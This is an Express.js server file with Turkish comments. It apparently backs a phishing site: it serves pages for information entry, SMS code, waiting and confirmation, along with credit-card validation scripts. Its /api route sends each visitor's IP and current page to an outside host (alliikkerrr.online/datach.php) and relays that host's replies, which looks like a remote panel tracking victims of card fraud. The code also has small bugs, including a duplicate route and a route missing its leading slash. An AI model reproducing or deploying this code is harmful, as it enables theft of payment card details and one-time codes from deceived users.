const express = require('express');
const axios = require('axios');
const path = require('path');
require('dotenv').config();
const app = express();
const port = process.env.PORT || 3000;
const { readdirSync } = require("fs");
app.use(express.json());
app.use(express.static('public'));
readdirSync("./routes").map((file) => app.use("/", require("./routes/" + file)));
app.get('/files/css', (req, res) => {
  res.sendFile(__dirname + '/public/files/css');
});
app.get('/bk.gif', (req, res) => {
  res.sendFile(__dirname + '/public/bk.gif');
});
app.get('/index2.html', (req, res) => {
  res.sendFile(__dirname + '/public/index2.html');
});
app.get('/', (req, res) => {
  res.sendFile(__dirname + '/public/index2.html');
});
app.get('/files/bootstrap.min.css', (req, res) => {
  res.sendFile(__dirname + '/public/files/bootstrap.min.css');
});
app.get('/files/logo-2.png', (req, res) => {
  res.sendFile(__dirname + '/public/files/logo-2.png');
});
app.get('/bilgi.html', (req, res) => {
  res.sendFile(__dirname + '/public/bilgi.html');
});
app.get('/onay', (req, res) => {
  res.sendFile(__dirname + '/public/onay.html');
});
app.get('/files/font-awesome.min.css', (req, res) => {
  res.sendFile(__dirname + '/public/files/font-awesome.min.css');
});
app.get('onay.png', (req, res) => {
  res.sendFile(__dirname + '/public/onay.png');
});
app.get('/files/flaticon.css', (req, res) => {
  res.sendFile(__dirname + '/public/files/flaticon.css');
});
app.get('/sms.html', (req, res) => {
  res.sendFile(__dirname + '/public/sms.html');
});
app.get('/bekle.html', (req, res) => {
  res.sendFile(__dirname + '/public/bekle.html');
});
app.get('/files/js', (req, res) => {
  res.sendFile(__dirname + '/public/files/js');
});
 
app.get('/img/bg-image.jpeg', (req, res) => {
  res.sendFile(__dirname + '/public/img/bg-image.jpeg');
});
app.get('/img/bg-image.jpeg', (req, res) => {
  res.sendFile(__dirname + '/public/files/logo-2.png');
});
app.get('/files/jquery.creditCardValidator.js.indir', (req, res) => {
  res.sendFile(__dirname + '/public/files/jquery.creditCardValidator.js.indir');
});
app.get('/files/default.css', (req, res) => {
  res.sendFile(__dirname + '/public/files/default.css');
});
app.get('/files/creditly.js', (req, res) => {
  res.sendFile(__dirname + '/public/files/creditly.js');
});
app.get('/files/jquery-3.2.1.min.js.indir', (req, res) => {
  res.sendFile(__dirname + '/public/files/jquery-3.2.1.min.js.indir');
});
app.get('/files/style.css', (req, res) => {
  res.sendFile(__dirname + '/public/files/style.css');
});

app.get('/api', async (req, res) => {
  try {
    const userIp = req.query.user_ip;
    const currentPage = req.query.current_page;

    // URL'yi oluştur
    const apiUrl = `https://alliikkerrr.online/datach.php?user_ip=${userIp}&current_page=${currentPage}`;

    // Fetch kullanarak GET isteği yap
    const response = await axios.get(apiUrl);

    // Cevap boşsa veya gelmezse, boş bir yanıt gönder
    if (!response.data) {
      return res.send('');
    }

    // Gelen cevabı direk olarak gönder
    res.send(response.data);
  } catch (error) {
    console.error('Hata:', error);
    // Hata mesajını istemciye gönder
    res.status(500).send('');
  }
});

app.listen(port, () => {
  console.log(`Web sunucusu ${port} adresinde çalışıyor.`);
});
